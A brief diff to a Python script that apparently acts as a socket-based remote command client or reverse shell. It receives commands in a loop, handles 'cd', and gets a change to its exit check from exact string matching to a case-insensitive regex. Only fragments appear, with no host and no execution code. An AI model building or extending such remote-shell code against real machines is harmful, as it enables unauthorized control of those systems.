@@ -1,4 +1,4 @@
-import os, socket, subprocess, sys
+import os, socket, subprocess, sys, re
 
 def create_socket():
     try:
@@ -29,7 +29,7 @@ def receive_cmd():
         while True:
             data = sock.recv(1024)
             print(data.decode())
-            if data.decode() == "Exit" or data.decode() == "exit":
+            if re.search("exit", data.decode(), re.IGNORECASE):
                 sock.close()
                 os._exit(0)
             if data[:2].decode() == "cd":
